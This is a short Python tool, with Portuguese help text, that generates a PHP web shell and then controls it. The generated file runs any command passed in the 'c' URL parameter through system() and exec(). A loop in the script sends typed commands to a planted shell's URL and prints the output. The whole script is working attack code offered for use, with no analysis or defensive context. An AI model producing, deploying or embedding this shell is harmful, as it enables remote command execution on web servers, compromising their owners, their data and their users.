from bs4 import BeautifulSoup
from argparse import ArgumentParser
from requests import get

global args
parser = ArgumentParser()
parser.add_argument("-u", dest="shell_url", action="store", help="Url de sua shell!")
parser.add_argument("-g", dest="generate", action="store", help="Cria seu payload")
args = parser.parse_args()

if args.shell_url == None and args.generate == None:
    print(args)
    exit(0)
else:
    if args.generate != None and args.shell_url == None:
        shell_name = str(args.generate)
        shell = shell_name+'.php'
        opfile = open(shell,'+w')
        evel_code = '''
<?php
echo system($_GET['c']);
echo exec($_GET['c']);
?>
'''
        opfile.write(evel_code)
        opfile.close()
        print(shell+' is generated')

    if args.shell_url != None and args.generate == None:
        url = str(args.shell_url)
        while True:
            cmd = str(input(">> "))
            r = get(url+"?c={0}".format(cmd)).content
            print(r)
